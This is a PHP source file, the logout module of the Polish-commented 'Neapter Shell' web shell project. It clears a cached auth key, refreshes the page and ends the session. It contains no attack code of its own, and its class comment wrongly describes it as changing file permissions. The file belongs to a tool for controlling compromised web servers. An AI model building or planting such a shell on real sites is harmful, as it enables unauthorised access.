<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   Neapter_Shell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2012-2016 Krzysztof Otręba
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link      https://github.com/krzotr/neapter-shell
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @category  WebShell
 * @package   Neapter_Shell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2012-2016 Krzysztof Otręba
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link      https://github.com/krzotr/neapter-shell
 */
class ModuleLogout extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'logout',
            'quit',
            'exit'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-06-06 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
exit, quit, logout - Wylogowanie z shella

    Użycie:
        logout
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sAuthKeyFile = $this->oUtils->getAuthFileKey();
        $sAuth = $this->oUtils->cacheGet($sAuthKeyFile);

        if ($sAuth) {
            $this->oUtils->cacheSet($sAuthKeyFile, '');
        }

        @header('Refresh:1;url=' . Request::getCurrentUrl());
        echo "See you (:\n";

        $this->oShell->eof();
    }
}
